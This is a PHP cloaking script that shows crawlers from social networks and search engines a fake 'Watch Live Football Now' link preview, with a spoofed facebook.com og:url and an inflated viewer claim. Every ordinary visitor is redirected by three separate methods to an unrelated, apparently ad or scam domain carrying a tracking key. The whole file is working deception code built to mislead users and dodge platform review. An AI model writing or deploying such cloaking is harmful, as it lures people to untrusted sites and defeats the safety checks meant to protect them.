<?php
ob_start(); // Start output buffering

// --- Universal Bot Detector --- //
function isBot($ua) {
    $bots = [
        'Twitterbot','facebookexternalhit','LinkedInBot','Pinterest','Slackbot',
        'WhatsApp','TelegramBot','Googlebot','bingbot','Yahoo! Slurp',
        'DuckDuckBot','Baiduspider','YandexBot','Facebot','ia_archiver'
    ];
    foreach ($bots as $bot) {
        if (stripos($ua, $bot) !== false) return true;
    }
    return false;
}

// --- Detect User-Agent --- //
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (isBot($ua)) {
    // --- Bot কে meta preview দেখাবে --- //
    echo '<!doctype html><html lang="en"><head>';
    echo '<meta charset="utf-8">';
    echo '<title>Watch Live Football Now</title>';
    echo '<meta property="og:title" content="🔥Watch Live Football Now! La Liga, Premier League & More⚽">';
    echo '<meta property="og:description" content="Live 100M+ viewers watching">';
    echo '<meta property="og:image" content="https://raw.githubusercontent.com/kindwordai/images/main/555.jpg">';
    echo '<meta property="og:url" content="https://facebook.com">';
    echo '<meta name="twitter:card" content="summary_large_image">';
    echo '<meta name="twitter:title" content="🔥Watch Live Football Now! La Liga, Premier League & More⚽">';
    echo '<meta name="twitter:description" content="Live 100M+ viewers watching">';
    echo '<meta name="twitter:image" content="https://raw.githubusercontent.com/kindwordai/images/main/555.jpg">';
    echo '</head><body>';
    echo '<h1>Social Preview Page</h1>';
    echo '<p>If you are seeing this, you are a crawler (Twitter / FB / Google / etc.).</p>';
    echo '</body></html>';
    exit;
} 

// --- Normal user redirect (server-side + JS) --- //
$redirectUrl = 'https://forgavedisciplinetolerance.com/efs91qh7?key=14d0414f871e75aa0cf508de7021d167';

// Server-side redirect (fallback)
header("Location: $redirectUrl");
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

// JS redirect (main)
echo "<script>window.location.replace('".addslashes($redirectUrl)."');</script>";
echo "<noscript><meta http-equiv='refresh' content='0;url=".htmlspecialchars($redirectUrl)."'></noscript>";

ob_end_flush();
exit;
?>
